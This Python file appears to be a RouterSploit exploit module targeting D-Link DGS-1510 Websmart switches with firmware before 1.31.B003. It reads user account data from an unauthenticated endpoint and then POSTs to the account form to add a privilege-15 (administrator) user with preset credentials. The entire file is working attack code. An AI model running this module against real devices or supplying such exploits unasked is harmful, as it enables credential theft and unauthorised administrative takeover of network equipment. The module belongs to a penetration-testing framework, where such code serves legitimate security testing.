import re
import gzip
import zlib
from StringIO import StringIO
from routersploit import (
    exploits,
    print_error,
    print_status,
    print_success,
    print_table,
    http_request,
    mute,
    validators
)


class Exploit(exploits.Exploit):
    """
    D-Link DGS-1510-28XMP, DGS-1510-28X, DGS-1510-52X, DGS-1510-52,
    DGS-1510-28P, DGS-1510-28, and DGS-1510-20 Websmart devices with firmware
    before 1.31.B003 allow attackers to conduct Unauthenticated Information Disclosure
    attacks via unspecified vectors.
    """
    __info__ = {
        'name': 'D-Link DGS-1510 Add User',
        'description': 'D-Link DGS-1510-28XMP, DGS-1510-28X, DGS-1510-52X, DGS-1510-52, DGS-1510-28P, DGS-1510-28 and DGS-1510-20 '
                       'Websmart devices with firmware before 1.31.B003 allow attackers to conduct Unauthenticated Information Disclosure '
                       'attacks via unspecified vectors.',
        'authors': [
            'Varang Amin',  # vulnerability discovery
            'Dino Causevic'  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/41662/',
        ],
        'devices': [
            'D-Link DGS-1510-28XMP',
            'D-Link DGS-1510-28X',
            'D-Link DGS-1510-52X',
            'D-Link DGS-1510-52',
            'D-Link DGS-1510-28P',
            'D-Link DGS-1510-28',
            'D-Link DGS-1510-20'
        ],
    }

    target = exploits.Option('http://192.168.1.1', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    username = exploits.Option('dlinkuser', 'User to add in case that user_add option is used.')
    password = exploits.Option('dlinkpwd1234', 'Password for user in case that user_add option is used.')
    response_content = None

    def decompress(self, content, encoding):
        ret = content

        if encoding == 'gzip':
            ret = gzip.GzipFile(fileobj=StringIO(ret)).read()

        elif encoding == 'deflate':
            decompress = zlib.decompressobj(-zlib.MAX_WBITS)
            inflated = decompress.decompress(ret)
            inflated += decompress.flush()
            ret = inflated

        return ret.replace("\n", "")

    def extract_users(self, content):
        m_groups = re.match(r'(.*)UserInfo.=.([^;]*)(.*)', content, re.I | re.M)
        return m_groups

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")

            print_status("Extracting user information...")
            m_groups = self.extract_users(self.response_content)
            if m_groups and m_groups.groups > 2:
                print_table(("User Info", ), (m_groups.group(2), ))
            else:
                # Print something, in case that formats vary over models
                # maybe regex will not work and we don't want to leave
                # users without information
                print_table(("User Info", ), (self.response_content, ))

            print_status("Trying to add new user...")
            url = "{}:{}/form/User_Accounts_Apply".format(self.target, self.port)
            data = {
                "action": "0",
                "username": self.username,
                "privilege": "15",
                "type": "0",
                "password": self.password
            }

            headers = {
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "Origin": "{}:{}/".format(self.target, self.port),
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.51 Safari/537.36",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Referer": "{}:{}/www/login.html".format(self.target, self.port),
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.8"
            }

            response = http_request(method="POST", url=url, headers=headers, data=data)

            if response is not None:
                print_success("Exploit success - new user added: {} / {}".format(self.username, self.password))
            else:
                print_error("Exploid failed - user could not be added")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        self.response_content = None

        url = "{}:{}/DataStore/990_user_account.js?index=0&pagesize=10".format(self.target, self.port)
        headers = {
            "Connection": "keep-alive",
            "Accept": "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.59 Safari/537.36",
            "Referer": "{}:{}/www/login.html".format(self.target, self.port),
            "Accept-Encoding": "gzip, deflate, sdch",
            "Accept-Language": "en-US,en;q=0.8",
            "Cookie": "Language=en"
        }

        response = http_request(method="GET", url=url, headers=headers)

        if response is not None and response.status_code == 200:
            self.response_content = self.decompress(response.content,
                                                    response.headers.get('content-encoding', None))

            m_groups = self.extract_users(self.response_content)
            if m_groups:
                return True  # target is vulnerable

        return False  # target is not vulnerable
